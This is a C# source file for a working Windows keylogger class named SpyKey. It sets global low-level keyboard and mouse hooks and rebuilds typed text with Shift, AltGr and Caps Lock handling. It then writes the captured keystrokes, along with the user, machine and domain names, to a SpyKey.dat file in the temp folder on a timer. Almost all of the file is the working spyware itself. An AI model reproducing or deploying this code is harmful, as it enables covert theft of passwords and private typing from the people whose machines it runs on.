using System;
using System.Diagnostics;
using System.IO;
using System.Runtime.InteropServices;
using System.Text;

namespace Classes
{
    internal static class SpyKey
    {
        internal class KeyboardEventArgs : EventArgs { internal TagKBDLLHOOKSTRUCT LowLevelKbInfo; }
        internal class MouseEventArgs : EventArgs { internal TagMSLLHOOKSTRUCT LowLevelMsInfo; }
        [Flags]
        public enum MSDLLHOOKSTRUCTFlags
        {
            LLMHF_INJECTED = 0x00000001, // Test the event-injected (from any process) flag.
            LLMHF_LOWER_IL_INJECTED = 0x00000002 // Test the event-injected (from a process running at lower integrity level) flag.
        }
        [Flags]
        public enum KBDLLHOOKSTRUCTFlags
        {
            LLKHF_EXTENDED = 0x00000001,
            LLKHF_LOWER_IL_INJECTED = 0x00000002,
            LLKHF_INJECTED = 0x00000010,
            LLKHF_ALTDOWN = 0x00000020,
            LLKHF_UP = 0x00000080,
        }
        [Flags]
        private enum HOOKPROCID
        {
            WH_KEYBOARD = 2, /// <summary>Installs a hook procedure that monitors keystroke messages. For more information, see the KeyboardProc hook procedure.</summary>
            WH_KEYBOARD_LL = 13, /// <summary>Installs a hook procedure that monitors low-level keyboard input events. For more information, see the LowLevelKeyboardProc hook procedure.</summary>
            WH_CALLWNDPROC = 4, /// <summary>Installs a hook procedure that monitors messages before the system sends them to the destination window procedure. For more information, see the CallWndProc hook procedure.</summary>
            WH_CALLWNDPROCRET = 12, /// <summary>Installs a hook procedure that monitors messages after they have been processed by the destination window procedure. For more information, see the CallWndRetProc hook procedure.</summary>
            WH_CBT = 5, /// <summary>Installs a hook procedure that receives notifications useful to a CBT application. For more information, see the CBTProc hook procedure.</summary>
            WH_DEBUG = 9, /// <summary>Installs a hook procedure useful for debugging other hook procedures. For more information, see the DebugProc hook procedure.</summary>
            WH_FOREGROUNDIDLE = 11, /// <summary>Installs a hook procedure that will be called when the application's foreground thread is about to become idle. This hook is useful for performing low priority tasks during idle time. For more information, see the ForegroundIdleProc hook procedure.</summary>
            WH_GETMESSAGE = 3, /// <summary>Installs a hook procedure that monitors messages posted to a message queue. For more information, see the GetMsgProc hook procedure.</summary>
            WH_JOURNALPLAYBACK = 1, /// <summary>Installs a hook procedure that posts messages previously recorded by a WH_JOURNALRECORD hook procedure. For more information, see the JournalPlaybackProc hook procedure.</summary>
            WH_JOURNALRECORD = 0, /// <summary>Installs a hook procedure that records input messages posted to the system message queue. This hook is useful for recording macros. For more information, see the JournalRecordProc hook procedure.</summary>
            WH_MOUSE = 7, /// <summary>Installs a hook procedure that monitors mouse messages. For more information, see the MouseProc hook procedure.</summary>
            WH_MOUSE_LL = 14, /// <summary>Installs a hook procedure that monitors low-level mouse input events. For more information, see the LowLevelMouseProc hook procedure.</summary>
            WH_MSGFILTER = -1, /// <summary>Installs a hook procedure that monitors messages generated as a result of an input event in a dialog box, message box, menu, or scroll bar. For more information, see the MessageProc hook procedure.</summary>
            WH_SHELL = 10, /// <summary>Installs a hook procedure that receives notifications useful to shell applications. For more information, see the ShellProc hook procedure.</summary>
            WH_SYSMSGFILTER = 6, /// <summary>Installs a hook procedure that monitors messages generated as a result of an input event in a dialog box, message box, menu, or scroll bar. The hook procedure monitors these messages for all applications in the same desktop as the calling thread. For more information, see the SysMsgProc hook procedure.</summary>
        }
        [Flags]
        private enum HOOKPROC
        {
            WM_KEYDOWN = 0x0100, /// <summary>Posted to the window with the keyboard focus when a nonsystem key is pressed. A nonsystem key is a key that is pressed when the ALT key is not pressed. </summary>
            WM_SYSKEYDOWN = 0x0104, /// <summary>Posted to the window with the keyboard focus when the user presses the F10 key (which activates the menu bar) or holds down the ALT key and then presses another key. It also occurs when no window currently has the keyboard focus; in this case, the WM_SYSKEYDOWN message is sent to the active window. The window that receives the message can distinguish between these two contexts by checking the context code in the lParam parameter.</summary>
            WM_KEYUP = 0x0101, /// <summary>Posted to the window with the keyboard focus when a nonsystem key is released. A nonsystem key is a key that is pressed when the ALT key is not pressed, or a keyboard key that is pressed when a window has the keyboard focus. </summary>
            WM_SYSKEYUP = 0x0105, /// <summary>Posted to the window with the keyboard focus when the user releases a key that was pressed while the ALT key was held down. It also occurs when no window currently has the keyboard focus; in this case, the WM_SYSKEYUP message is sent to the active window. The window that receives the message can distinguish between these two contexts by checking the context code in the lParam parameter.</summary>
            WM_LBUTTONDOWN = 0x0201, /// <summary>Posted when the user presses the left mouse button while the cursor is in the client area of a window. If the mouse is not captured, the message is posted to the window beneath the cursor. Otherwise, the message is posted to the window that has captured the mouse.</summary>
            WM_LBUTTONUP = 0x0202, /// <summary>Posted when the user releases the left mouse button while the cursor is in the client area of a window. If the mouse is not captured, the message is posted to the window beneath the cursor. Otherwise, the message is posted to the window that has captured the mouse.</summary>
            WM_MOUSEMOVE = 0x0200, /// <summary>Posted to a window when the cursor moves. If the mouse is not captured, the message is posted to the window that contains the cursor. Otherwise, the message is posted to the window that has captured the mouse.</summary>
            WM_MOUSEWHEEL = 0x020A, /// <summary>Sent to the focus window when the mouse wheel is rotated. The DefWindowProc function propagates the message to the window's parent. There should be no internal forwarding of the message, since DefWindowProc propagates it up the parent chain until it finds a window that processes it.</summary>
            WM_MOUSEHWHEEL = 0x020E, /// <summary>Sent to the active window when the mouse's horizontal scroll wheel is tilted or rotated. The DefWindowProc function propagates the message to the window's parent. There should be no internal forwarding of the message, since DefWindowProc propagates it up the parent chain until it finds a window that processes it.</summary>
            WM_RBUTTONDOWN = 0x0204, /// <summary>Posted when the user presses the right mouse button while the cursor is in the client area of a window. If the mouse is not captured, the message is posted to the window beneath the cursor. Otherwise, the message is posted to the window that has captured the mouse.</summary>
            WM_RBUTTONUP = 0x0205, /// <summary>Posted when the user releases the right mouse button while the cursor is in the client area of a window. If the mouse is not captured, the message is posted to the window beneath the cursor. Otherwise, the message is posted to the window that has captured the mouse.</summary>
        }
        [Flags]
        public enum KeyFlags : int
        {
            KF_EXTENDED = 0x0100,
            KF_DLGMODE = 0x0800,
            KF_MENUMODE = 0x1000,
            KF_ALTDOWN = 0x2000,
            KF_REPEAT = 0x4000,
            KF_UP = 0x8000
        }
        [Flags]
        public enum MouseData : uint
        {
            WM_MOUSEWHEEL = 0x020A,
            WM_XBUTTONDOWN = 0x020B,
            WM_XBUTTONUP  = 0x020C,
            WM_XBUTTONDBLCLK = 0x020D,
            WM_NCXBUTTONDOWN = 0x00AB,
            WM_NCXBUTTONUP = 0x00AC,
            WM_NCXBUTTONDBLCLK = 0x00AD
        }

        [DllImport("user32.dll", CharSet = CharSet.Auto, ExactSpelling = true, CallingConvention = CallingConvention.Winapi)]
        public static extern ushort GetKeyState(int keyCode);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true, CallingConvention = CallingConvention.Winapi)]
        private static extern IntPtr SetWindowsHookEx(HOOKPROCID idHook, Delegate lpfn, IntPtr hMod, uint dwThreadId);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true, CallingConvention = CallingConvention.Winapi)]
        [return: MarshalAs(UnmanagedType.Bool)]
        private static extern bool UnhookWindowsHookEx(IntPtr hhk);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true, CallingConvention = CallingConvention.Winapi)]
        private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, HOOKPROC wParam, [In]TagKBDLLHOOKSTRUCT lParam);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true, CallingConvention = CallingConvention.Winapi)]
        private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, HOOKPROC wParam, [In]TagMSLLHOOKSTRUCT lParam);

        [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true, CallingConvention = CallingConvention.Winapi)]
        private static extern IntPtr GetModuleHandle(string lpModuleName);
        

        private delegate IntPtr LowLevelKeyboardProc(int nCode, HOOKPROC wParam, TagKBDLLHOOKSTRUCT lParam);
        private delegate IntPtr LowLevelMouseProc(int nCode, HOOKPROC wParam, TagMSLLHOOKSTRUCT lParam);


        private static LowLevelKeyboardProc _KbLowLevelProc = KbLLHookCallback;
        private static LowLevelMouseProc _MsLowLevelProc = MsLLHookCallback;


        private static IntPtr _LowLevelKbHookID = IntPtr.Zero;
        private static IntPtr _LowLevelMsHookID = IntPtr.Zero;


        internal static event EventHandler<KeyboardEventArgs> OnKeyDownEvent;
        internal static event EventHandler<KeyboardEventArgs> OnKeyUpEvent;
        internal static event EventHandler<MouseEventArgs> OnMouseLBtnDownEvent;
        internal static event EventHandler<MouseEventArgs> OnMouseLBtnUpEvent;
        internal static event EventHandler<MouseEventArgs> OnMouseRBtnDownEvent;
        internal static event EventHandler<MouseEventArgs> OnMouseRBtnUpEvent;

        private static System.Timers.Timer timer = new System.Timers.Timer() { Interval = 8000 };
        private static string KbLayoutName = System.Windows.Forms.InputLanguage.CurrentInputLanguage.LayoutName;
        internal static StringBuilder strBuilder = new StringBuilder();

        internal static void Start()
        {
            _LowLevelKbHookID = SetWindowsHook(_KbLowLevelProc, HOOKPROCID.WH_KEYBOARD_LL);
            _LowLevelMsHookID = SetWindowsHook(_MsLowLevelProc, HOOKPROCID.WH_MOUSE_LL);
            timer.Elapsed += Timer_Elapsed;
            WriteSysInfo();
        }
        internal static void Stop()
        {
            UnhookWindowsHookEx(_LowLevelKbHookID);
            UnhookWindowsHookEx(_LowLevelMsHookID);
            timer.Elapsed -= Timer_Elapsed;
        }
        
        internal struct TagMSLLHOOKSTRUCT
        {
            public System.Drawing.Point pt;
            public MouseData mouseData;
            public MSDLLHOOKSTRUCTFlags flags;
            public uint time;
            public UIntPtr dwExtraInfo;
        }
        internal struct TagKBDLLHOOKSTRUCT
        {
            public VK_KEY_CODE vkCode;
            public uint scanCode;
            public KBDLLHOOKSTRUCTFlags flags;
            public uint time;
            public UIntPtr dwExtraInfo;
        }

        private static IntPtr SetWindowsHook(Delegate HookProc, HOOKPROCID HookID)
        {
            using (Process process = Process.GetCurrentProcess())
            using (ProcessModule module = process.MainModule)
            {
                return SetWindowsHookEx(HookID, HookProc, GetModuleHandle(module.ModuleName), 0);
            }
        }

        private static bool SHIFT_KEY_DOWN = false;
        private static bool ALTGR_KEY_DOWN = false;
        private static bool ALT_KEY_DOWN = false;
        private static bool CTRL_KEY_DOWN = false;
        private static bool WIN_KEY_DOWN = false;

        private static bool CAPS_LOCK_ON;
        private static bool NumLock;
        private static bool ScrollLock;
        private static char VK_CHAR;
        
        private static IntPtr MsLLHookCallback(int nCode, HOOKPROC wParam, TagMSLLHOOKSTRUCT lParam)
        {
            MouseEventArgs MsEventArgs = new MouseEventArgs();
            MsEventArgs.LowLevelMsInfo.dwExtraInfo = lParam.dwExtraInfo;
            MsEventArgs.LowLevelMsInfo.flags = lParam.flags;
            MsEventArgs.LowLevelMsInfo.mouseData = lParam.mouseData;
            MsEventArgs.LowLevelMsInfo.pt = lParam.pt;
            MsEventArgs.LowLevelMsInfo.time = lParam.time;
            switch (wParam)
            {
                case HOOKPROC.WM_LBUTTONDOWN:
                    OnMouseLBtnDownEvent?.Invoke(nCode, MsEventArgs);
                    break;
                case HOOKPROC.WM_LBUTTONUP:
                    OnMouseLBtnUpEvent?.Invoke(nCode, MsEventArgs);
                    break;
                case HOOKPROC.WM_RBUTTONDOWN:
                    OnMouseRBtnDownEvent?.Invoke(nCode, MsEventArgs);
                    break;
                case HOOKPROC.WM_RBUTTONUP:
                    OnMouseRBtnUpEvent?.Invoke(nCode, MsEventArgs);
                    break;
            }
            return CallNextHookEx(_LowLevelMsHookID, nCode, wParam, lParam);
        }

        private static IntPtr KbLLHookCallback(int nCode, HOOKPROC wParam, TagKBDLLHOOKSTRUCT lParam)
        {
            KeyboardEventArgs EvtArgs = new KeyboardEventArgs();
            EvtArgs.LowLevelKbInfo.dwExtraInfo = lParam.dwExtraInfo;
            EvtArgs.LowLevelKbInfo.flags = lParam.flags;
            EvtArgs.LowLevelKbInfo.scanCode = lParam.scanCode;
            EvtArgs.LowLevelKbInfo.time = lParam.time;
            EvtArgs.LowLevelKbInfo.vkCode = lParam.vkCode;
            if (nCode >= 0 && (wParam == HOOKPROC.WM_KEYDOWN || wParam == HOOKPROC.WM_SYSKEYDOWN) && lParam.flags == KBDLLHOOKSTRUCTFlags.LLKHF_EXTENDED)
            {
                if (lParam.vkCode.Equals(VK_KEY_CODE.VK_SHIFT) || lParam.vkCode.Equals(VK_KEY_CODE.VK_LSHIFT) || lParam.vkCode.Equals(VK_KEY_CODE.VK_RSHIFT))
                { SHIFT_KEY_DOWN = true; }
            }
            if (nCode >= 0 && (wParam == HOOKPROC.WM_KEYDOWN || wParam == HOOKPROC.WM_SYSKEYDOWN))
            {
                CAPS_LOCK_ON = GetKeyState(0x14) != 0 || System.Windows.Forms.Control.IsKeyLocked(System.Windows.Forms.Keys.CapsLock);
                NumLock = GetKeyState(0x90) != 0;
                ScrollLock = GetKeyState(0x91) != 0;
                VK_CHAR = '\u0000';
                OnKeyDownEvent?.Invoke(nCode, EvtArgs);
                switch (lParam.vkCode)
                {
                    case VK_KEY_CODE.VK_LWIN:
                        WIN_KEY_DOWN = true;
                        break;
                    case VK_KEY_CODE.VK_RWIN:
                        WIN_KEY_DOWN = true;
                        break;
                    case VK_KEY_CODE.VK_CAPITAL:
                        break;
                    case VK_KEY_CODE.VK_MENU:
                        ALT_KEY_DOWN = true;
                        break;
                    case VK_KEY_CODE.VK_LMENU:
                        ALT_KEY_DOWN = true;
                        break;
                    case VK_KEY_CODE.VK_RMENU:
                        ALTGR_KEY_DOWN = true;
                        break;
                    case VK_KEY_CODE.VK_SHIFT:
                        SHIFT_KEY_DOWN = true;
                        break;
                    case VK_KEY_CODE.VK_RSHIFT:
                        SHIFT_KEY_DOWN = true;
                        break;
                    case VK_KEY_CODE.VK_LSHIFT:
                        SHIFT_KEY_DOWN = true;
                        break;
                    case VK_KEY_CODE.VK_CONTROL:
                        CTRL_KEY_DOWN = true;
                        break;
                    case VK_KEY_CODE.VK_LCONTROL:
                        CTRL_KEY_DOWN = true;
                        break;
                    case VK_KEY_CODE.VK_RCONTROL:
                        CTRL_KEY_DOWN = true;
                        break;
                    case VK_KEY_CODE.VK_SPACE:
                        strBuilder.Append(" ");
                        break;
                    case VK_KEY_CODE.VK_RETURN:
                        strBuilder.AppendLine();
                        break;
                    case VK_KEY_CODE.VK_BACK:
                        break;
                    case VK_KEY_CODE.VK_0:
                        //VK_CHAR = SHIFT_KEY_DOWN ? '\u003D' : '\u0030';
                        VK_CHAR = '\u0030';
                        break;
                    case VK_KEY_CODE.VK_1:
                        //VK_CHAR = SHIFT_KEY_DOWN ? '\u0021' : '\u0031';
                        VK_CHAR = '\u0031';
                        break;
                    case VK_KEY_CODE.VK_2:
                        //VK_CHAR = SHIFT_KEY_DOWN ? '\u0022' : '\u0032';
                        VK_CHAR = '\u0032';
                        break;
                    case VK_KEY_CODE.VK_3:
                        //VK_CHAR = SHIFT_KEY_DOWN ? '\u0023' : '\u0033';
                        VK_CHAR = '\u0033';
                        break;
                    case VK_KEY_CODE.VK_4:
                        //VK_CHAR = SHIFT_KEY_DOWN ? '\u0024' : '\u0034';
                        VK_CHAR = '\u0034';
                        break;
                    case VK_KEY_CODE.VK_5:
                        //VK_CHAR = SHIFT_KEY_DOWN ? '\u0025' : '\u0035';
                        VK_CHAR = '\u0035';
                        break;
                    case VK_KEY_CODE.VK_6:
                        //VK_CHAR = SHIFT_KEY_DOWN ? '\u0026' : '\u0036';
                        VK_CHAR = '\u0036';
                        break;
                    case VK_KEY_CODE.VK_7:
                        //VK_CHAR = SHIFT_KEY_DOWN ? '\u002F' : '\u0037';
                        VK_CHAR = '\u0037';
                        break;
                    case VK_KEY_CODE.VK_8:
                        //VK_CHAR = SHIFT_KEY_DOWN ? '\u0028' : '\u0038';
                        VK_CHAR = '\u0038';
                        break;
                    case VK_KEY_CODE.VK_9:
                        //VK_CHAR = SHIFT_KEY_DOWN ? '\u0029' : '\u0039';
                        VK_CHAR = '\u0039';
                        break;
                    case VK_KEY_CODE.VK_A:
                        VK_CHAR = (CAPS_LOCK_ON || SHIFT_KEY_DOWN) ? '\u0041' : '\u0061';
                        break;
                    case VK_KEY_CODE.VK_B:
                        VK_CHAR = (CAPS_LOCK_ON || SHIFT_KEY_DOWN) ? '\u0042' : '\u0062';
                        break;
                    case VK_KEY_CODE.VK_C:
                        VK_CHAR = (CAPS_LOCK_ON || SHIFT_KEY_DOWN) ? '\u0043' : '\u0063';
                        break;
                    case VK_KEY_CODE.VK_D:
                        VK_CHAR = (CAPS_LOCK_ON || SHIFT_KEY_DOWN) ? '\u0044' : '\u0064';
                        break;
                    case VK_KEY_CODE.VK_E:
                        VK_CHAR = (CAPS_LOCK_ON || SHIFT_KEY_DOWN) ? '\u0045' : '\u0065';
                        break;
                    case VK_KEY_CODE.VK_F:
                        VK_CHAR = (CAPS_LOCK_ON || SHIFT_KEY_DOWN) ? '\u0046' : '\u0066';
                        break;
                    case VK_KEY_CODE.VK_G:
                        VK_CHAR = (CAPS_LOCK_ON || SHIFT_KEY_DOWN) ? '\u0047' : '\u0067';
                        break;
                    case VK_KEY_CODE.VK_H:
                        VK_CHAR = (CAPS_LOCK_ON || SHIFT_KEY_DOWN) ? '\u0048' : '\u0068';
                        break;
                    case VK_KEY_CODE.VK_I:
                        VK_CHAR = (CAPS_LOCK_ON || SHIFT_KEY_DOWN) ? '\u0049' : '\u0069';
                        break;
                    case VK_KEY_CODE.VK_J:
                        VK_CHAR = (CAPS_LOCK_ON || SHIFT_KEY_DOWN) ? '\u004A' : '\u006A';
                        break;
                    case VK_KEY_CODE.VK_K:
                        VK_CHAR = (CAPS_LOCK_ON || SHIFT_KEY_DOWN) ? '\u004B' : '\u006B';
                        break;
                    case VK_KEY_CODE.VK_L:
                        VK_CHAR = (CAPS_LOCK_ON || SHIFT_KEY_DOWN) ? '\u004C' : '\u006C';
                        break;
                    case VK_KEY_CODE.VK_M:
                        VK_CHAR = (CAPS_LOCK_ON || SHIFT_KEY_DOWN) ? '\u004D' : '\u006D';
                        break;
                    case VK_KEY_CODE.VK_N:
                        VK_CHAR = (CAPS_LOCK_ON || SHIFT_KEY_DOWN) ? '\u004E' : '\u006E';
                        break;
                    case VK_KEY_CODE.VK_O:
                        VK_CHAR = (CAPS_LOCK_ON || SHIFT_KEY_DOWN) ? '\u004F' : '\u006F';
                        break;
                    case VK_KEY_CODE.VK_P:
                        VK_CHAR = (CAPS_LOCK_ON || SHIFT_KEY_DOWN) ? '\u0050' : '\u0070';
                        break;
                    case VK_KEY_CODE.VK_Q:
                        VK_CHAR = (CAPS_LOCK_ON || SHIFT_KEY_DOWN) ? '\u0051' : '\u0071';
                        break;
                    case VK_KEY_CODE.VK_R:
                        VK_CHAR = (CAPS_LOCK_ON || SHIFT_KEY_DOWN) ? '\u0052' : '\u0072';
                        break;
                    case VK_KEY_CODE.VK_S:
                        VK_CHAR = (CAPS_LOCK_ON || SHIFT_KEY_DOWN) ? '\u0053' : '\u0073';
                        break;
                    case VK_KEY_CODE.VK_T:
                        VK_CHAR = (CAPS_LOCK_ON || SHIFT_KEY_DOWN) ? '\u0054' : '\u0074';
                        break;
                    case VK_KEY_CODE.VK_U:
                        VK_CHAR = (CAPS_LOCK_ON || SHIFT_KEY_DOWN) ? '\u0055' : '\u0075';
                        break;
                    case VK_KEY_CODE.VK_V:
                        VK_CHAR = (CAPS_LOCK_ON || SHIFT_KEY_DOWN) ? '\u0056' : '\u0076';
                        break;
                    case VK_KEY_CODE.VK_W:
                        VK_CHAR = (CAPS_LOCK_ON || SHIFT_KEY_DOWN) ? '\u0057' : '\u0077';
                        break;
                    case VK_KEY_CODE.VK_X:
                        VK_CHAR = (CAPS_LOCK_ON || SHIFT_KEY_DOWN) ? '\u0058' : '\u0078';
                        break;
                    case VK_KEY_CODE.VK_Y:
                        VK_CHAR = (CAPS_LOCK_ON || SHIFT_KEY_DOWN) ? '\u0059' : '\u0079';
                        break;
                    case VK_KEY_CODE.VK_Z:
                        VK_CHAR = (CAPS_LOCK_ON || SHIFT_KEY_DOWN) ? '\u005A' : '\u007A';
                        break;
                    case VK_KEY_CODE.VK_OEM_3:
                        if (KbLayoutName.ToLower().Equals("spanish") || KbLayoutName.ToLower().Equals("español")
                            || KbLayoutName.ToLower().Equals("latin american") || KbLayoutName.ToLower().Equals("america latina"))
                        { VK_CHAR = CAPS_LOCK_ON ? '\u00D1' : '\u00F1'; }
                        // char ñ or Ñ: For the US standard keyboard, the '`~' key
                        break;
                    case VK_KEY_CODE.VK_OEM_7:
                        // For the US standard keyboard, the 'single-quote/double-quote' key
                        break;
                    case VK_KEY_CODE.VK_OEM_2:
                        // For the US standard keyboard, the '/?' key
                        break;
                    case VK_KEY_CODE.VK_OEM_1:
                        break;
                    case VK_KEY_CODE.VK_OEM_4:
                        break;
                    case VK_KEY_CODE.VK_OEM_6:
                        break;
                    case VK_KEY_CODE.VK_OEM_5:
                        break;
                    case VK_KEY_CODE.VK_OEM_PERIOD:
                        //VK_CHAR = SHIFT_KEY_DOWN ? '\u003A' : '\u002E';
                        break;
                    case VK_KEY_CODE.VK_OEM_COMMA:
                        //VK_CHAR = SHIFT_KEY_DOWN ? '\u003B' : '\u002C';
                        break;
                    case VK_KEY_CODE.VK_OEM_MINUS:
                        //VK_CHAR = SHIFT_KEY_DOWN ? '\u005F' : '\u002D';
                        break;
                    case VK_KEY_CODE.VK_OEM_PLUS:
                        //if (SHIFT_KEY_DOWN) VK_CHAR = '\u002A';
                        //else VK_CHAR = '\u002B';
                        //if (ALTGR_KEY_DOWN) VK_CHAR = '\u007E';
                        break;
                    default:
                        break;
                }

                if (!WIN_KEY_DOWN && VK_CHAR != '\u0000' && ALTGR_KEY_DOWN && (lParam.vkCode >= VK_KEY_CODE.VK_0) && (lParam.vkCode <= VK_KEY_CODE.VK_9))
                {
                    timer.Stop();
                    strBuilder.Append("{ALTGR:" + Convert.ToString(VK_CHAR).ToLower() + "}");
                    timer.Start();
                }
                else if (!WIN_KEY_DOWN && VK_CHAR != '\u0000' && SHIFT_KEY_DOWN && (lParam.vkCode >= VK_KEY_CODE.VK_0) && (lParam.vkCode <= VK_KEY_CODE.VK_9))
                {
                    timer.Stop();
                    strBuilder.Append("{SHIFT:" + Convert.ToString(VK_CHAR).ToLower() + "}");
                    timer.Start();
                }
                else if (!WIN_KEY_DOWN && VK_CHAR != '\u0000' && ALTGR_KEY_DOWN && ((int)lParam.vkCode >= 41) && ((int)lParam.vkCode <= 80))
                {
                    timer.Stop();
                    strBuilder.Append("{ALTGR:" + Convert.ToString(VK_CHAR) + "}");
                    timer.Start();
                }
                else if (!WIN_KEY_DOWN && VK_CHAR != '\u0000' && SHIFT_KEY_DOWN && ((int)lParam.vkCode >= 41) && ((int)lParam.vkCode <= 80))
                {
                    timer.Stop();
                    if (CAPS_LOCK_ON) { strBuilder.Append("{SHIFT:" + Convert.ToString(VK_CHAR).ToLower() + "}"); }
                    else { strBuilder.Append("{SHIFT:" + Convert.ToString(VK_CHAR) + "}"); }
                    timer.Start();
                }
                else if (!WIN_KEY_DOWN && VK_CHAR != '\u0000' && (!CAPS_LOCK_ON && SHIFT_KEY_DOWN || CAPS_LOCK_ON && !SHIFT_KEY_DOWN))
                {
                    timer.Stop();
                    timer.AutoReset = true;
                    //Trace(char.ConvertFromUtf32(VK_CHAR));
                    Trace(Convert.ToString(VK_CHAR).ToUpper());
                    strBuilder.Append(Convert.ToString(VK_CHAR).ToUpper());

                    timer.Start();
                }
                else if (!WIN_KEY_DOWN && VK_CHAR != '\u0000')
                {
                    timer.Stop();
                    //Trace(char.ConvertFromUtf32(VK_CHAR));
                    Trace(Convert.ToString(VK_CHAR).ToLower());
                    strBuilder.Append(Convert.ToString(VK_CHAR).ToLower());
                    timer.Start();
                }
            }

            if (nCode >= 0 && (wParam == HOOKPROC.WM_KEYUP || wParam == HOOKPROC.WM_SYSKEYUP))
            {
                OnKeyUpEvent?.Invoke(nCode, EvtArgs);
                switch (lParam.vkCode)
                {
                    case VK_KEY_CODE.VK_LWIN:
                        WIN_KEY_DOWN = false;
                        break;
                    case VK_KEY_CODE.VK_RWIN:
                        WIN_KEY_DOWN = false;
                        break;
                    case VK_KEY_CODE.VK_LSHIFT:
                        SHIFT_KEY_DOWN = false;
                        break;
                    case VK_KEY_CODE.VK_RSHIFT:
                        SHIFT_KEY_DOWN = false;
                        break;
                    case VK_KEY_CODE.VK_RMENU:
                        ALTGR_KEY_DOWN = false;
                        break;
                    case VK_KEY_CODE.VK_BACK:
                        strBuilder.Append("{DEL}");
                        break;
                }
            }
            return CallNextHookEx(_LowLevelKbHookID, nCode, wParam, lParam);
        }
        private static void Timer_Elapsed(object sender, System.Timers.ElapsedEventArgs e)
        {
            WriteLogFile(strBuilder.ToString());
            strBuilder.Clear();
            timer.Stop();
        }

        private static void WriteLogFile(string LogText)
        {
            string FilePath = Path.Combine(Path.GetTempPath(), "SpyKey.dat");
            FileStream LogFile;
            try { LogFile = File.Open(FilePath, FileMode.Append, FileAccess.Write); }
            catch (Exception Ex) { Trace(Ex.Message); return; }
            byte[] LogBytes = Encoding.ASCII.GetBytes(LogText + Environment.NewLine);
            LogFile.Write(LogBytes, 0, LogBytes.Length);
            LogFile.Close();
        }

        internal static void Trace(string LogText)
        {
            foreach (TraceListener debug in Debug.Listeners)
            { debug.WriteLine(LogText); }
        }
        private static void WriteSysInfo()
        {
            WriteLogFile("Keyboard Layout Name: " + KbLayoutName);
            WriteLogFile("Date: " + DateTime.Now.ToLongDateString());
            WriteLogFile("Time: " + DateTime.Now.ToLongTimeString());
            WriteLogFile("User Name: " + Environment.UserName);
            WriteLogFile("Machine Name: " + Environment.MachineName);
            WriteLogFile("Domain Name: " + Environment.UserDomainName);
            WriteLogFile("OS Version: " + Environment.OSVersion);
        }
    }
}
